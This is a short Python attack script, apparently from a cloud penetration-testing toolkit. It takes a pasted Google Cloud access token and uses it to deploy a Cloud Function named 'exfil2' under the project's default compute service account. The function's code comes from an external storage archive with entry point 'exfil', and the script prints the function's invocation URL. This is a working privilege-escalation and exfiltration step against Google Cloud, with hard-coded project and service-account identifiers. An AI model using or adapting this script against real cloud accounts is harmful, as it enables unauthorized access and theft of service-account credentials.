from google.cloud.functions_v1 import CloudFunctionsServiceClient, CloudFunction, CreateFunctionRequest
import google.oauth2.credentials

#------change this--------
location = "us-east1"
function_name = "exfil2"
gsutil_uri = "gs://anirb/function.zip"
function_entry_point = "exfil"
project_id="nnnn-374620"
service_account = "637374802462-compute@developer.gserviceaccount.com"
#-------------------------

access_token = input('Enter Access Token: ')
credentials = google.oauth2.credentials.Credentials(access_token)
client = CloudFunctionsServiceClient(credentials=credentials)

url = "https://{}-{}.cloudfunctions.net/{}".format(location, project_id, function_name)

function = CloudFunction(
    name="projects/{}/locations/{}/functions/{}".format(project_id, location, function_name),
    source_archive_url="{}".format(gsutil_uri),
    entry_point=function_entry_point,
    runtime="python38",
    service_account_email=service_account,
    https_trigger={},
)

request = CreateFunctionRequest(location="projects/{}/locations/{}".format(project_id, location), function=function)

try:
    response = client.create_function(request=request)
    result = response.result()
    print(f"[+] Function Invocation URL: {url}")
    print("[+] Cloud Function creation has started")
    print("[+] Takes 1-2 minutes to create")

except Exception as e:
    if "cloudfunctions.operations.get" in str(e):
        print("[+] Permission cloudfunctions.operations.get denied (Not an Issue)")
        print(f"[+] Function Invocation URL: {url}")
        print("[+] Cloud Function creation has started")
        print("[+] Takes 1-2 minutes to create")
        
    else:
        print(f"[!] Error: {str(e)}")
